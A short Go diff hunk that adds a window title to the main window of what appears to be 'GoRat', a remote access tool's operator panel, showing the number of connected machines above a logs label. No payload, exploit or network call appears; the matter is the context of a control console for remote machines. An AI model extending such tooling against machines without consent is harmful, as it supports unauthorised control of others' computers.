@@ -11,6 +11,8 @@ import (
 )
 
 func MainWindow() {
+	go_rat.Window(fmt.Sprintf("GoRat - %d Connected Machines", len(database.GetConnections())))
+	
 	go_rat.SingleWindow().Layout(
 
 		go_rat.Label(fmt.Sprint("Logs:")),
